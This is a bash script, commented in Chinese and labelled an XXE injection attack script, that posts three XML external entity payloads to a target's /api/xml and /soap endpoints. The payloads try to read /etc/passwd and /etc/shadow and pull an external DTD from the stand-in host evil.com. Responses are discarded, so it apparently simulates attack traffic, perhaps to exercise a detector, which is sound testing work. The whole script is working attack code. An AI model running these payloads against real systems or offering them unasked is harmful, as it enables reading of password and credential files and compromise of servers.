#!/bin/bash
# XXE 注入攻击脚本
# 用法: TARGET=127.0.0.1:8080 ./xxe.sh

TARGET="${TARGET:-127.0.0.1:8080}"
echo "[XXE注入] 开始攻击 $TARGET ..."
sleep 1

echo "  [1/3] 外部实体读取文件"
curl -s -X POST "http://$TARGET/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>' > /dev/null
sleep 0.3

echo "  [2/3] 外部 DTD 引用"
curl -s -X POST "http://$TARGET/soap" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]>' > /dev/null
sleep 0.3

echo "  [3/3] 文件读取实体注入"
curl -s -X POST "http://$TARGET/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow">]><user>&ent;</user>' > /dev/null
sleep 0.3

echo "[XXE注入] 完成 (3 次攻击)"
